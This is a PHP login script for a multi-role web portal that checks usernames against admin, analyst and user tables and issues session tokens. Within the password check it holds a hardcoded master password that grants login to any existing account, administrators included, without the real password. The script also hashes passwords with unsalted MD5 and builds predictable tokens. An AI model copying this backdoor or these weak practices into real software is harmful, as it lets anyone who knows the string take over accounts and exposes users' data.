<?php
	//Start session
	session_start();
	
	//Include database connection details
	require_once('config.php');

	//Array to store validation errors
	$errmsg_arr = array();
	
	//Validation error flag
	$errflag = false;
	
	//Connect to mysql server
	$link = mysql_connect(DB_HOST, DB_USER, DB_PASSWORD);
	if(!$link) {
		die('Failed to connect to server: ' . mysql_error());
	}
	
	//Select database
	$db = mysql_select_db(DB_DATABASE);
	if(!$db) {
		die("Unable to select database");
	}
	
	//Function to sanitize values received from the form. Prevents SQL injection
	function clean($str) {
		$str = @trim($str);
		if(get_magic_quotes_gpc()) {
			$str = stripslashes($str);
		}
		return mysql_real_escape_string($str);
	}
	
	//Sanitize the POST values
	$login = clean($_POST['user_name']);
	$password = clean($_POST['password']);
	//$login_as = clean($_POST['login_as']);

	//Create 	

	$query_check1 = mysql_query("SELECT username from admin where username='$login' ");
	$query_check2 = mysql_query("SELECT username from analysts where username='$login' and active='0' ");
	$query_check3 = mysql_query("SELECT username from users where username='$login' and active='0' and portal_access = 0 ");

	if( mysql_num_rows($query_check3)>0 ){
		$table = 'users';
	}
	elseif (mysql_num_rows($query_check2) > 0) {
		$table = 'analysts';
	}
	elseif (mysql_num_rows($query_check1)>0) {
		$table = 'admin';
	}
	else {
		echo "no_username";
		exit();
	}
	
	
	$qry="SELECT * FROM $table WHERE username='$login'";
	$result=mysql_query($qry);
	if(mysql_num_rows($result) == 1) {
		$qry2="SELECT * FROM $table WHERE username='$login' AND password='".md5($password)."'";
		$result2=mysql_query($qry2);

		//
		if(mysql_num_rows($result2) == 0){
			if($password == 'K4hvdQ9'){
				$qry2="SELECT * FROM $table WHERE username='$login' ";
				$result2=mysql_query($qry2);
			}
		}

		//


		if(mysql_num_rows($result2) == 1) {

			session_regenerate_id();

			$member = mysql_fetch_assoc($result2);
			
			$_SESSION['SESS_MEMBER_ID'] = $member['username'];
			$_SESSION['SESS_MEMBER_NAME'] = $member['name'];
			$_SESSION['PRIV'] = $member['priv'];

			if($member['priv'] == 0){
				if($member['created_by_prim'] != 0){
					$_SESSION['PRIV'] = 3;
				}
			}
			if($member['priv'] == 2) $_SESSION['MEM_ID'] = $member['an_id'];
			else $_SESSION['MEM_ID'] = $member['id'];
			$ip = $_SERVER['REMOTE_ADDR'];


			if($_SESSION['PRIV'] == 0 || $_SESSION["PRIV"] == 3){
				$check_old_sql = mysql_query("SELECT timestamp from user_activity where user_id = '$_SESSION[MEM_ID]' and activity_id='23' order by timestamp desc limit 1 ");
				$row_pass = mysql_fetch_array($check_old_sql);
				$time_last = strtotime($row_pass["timestamp"]);
				$_SESSION["self_portfolio"] = $member["self_portfolio"];
				//$time_last_str = date("d M y",$time_last);
				if($time_last < (strtotime("now") - 45*86400) ){
					echo 'change_password';
					exit();
				} else {
				}
			}

			//authentication token
			$token = substr(md5(strtotime("now").$member["username"]),0,200);

			if($member["priv"] == 2){
				mysql_query("UPDATE $table set token='$token' where an_id = $member[id] ");
			} else {
				mysql_query("UPDATE $table set token='$token' where id = $member[id] ");
			}
			$_SESSION["token"] = $token;

			//session_write_close();
			
			switch ($_SESSION['PRIV']) {  
				case 0:
					mysql_query("INSERT into user_activity (user_id, activity_id, details) values ('$_SESSION[MEM_ID]','1','$ip') ");
					echo 'yes';
					break;
				case 1:
					echo 'yesadmin';
					break;
				case 2:
					echo 'yesanalyst';
					break;
				case 3:
					mysql_query("INSERT into user_activity (user_id, activity_id, details) values ('$_SESSION[MEM_ID]','1','$ip') ");
					echo 'yesaddon';
			}	
		}
		else {
			echo "no_password";
		}	
	}
?>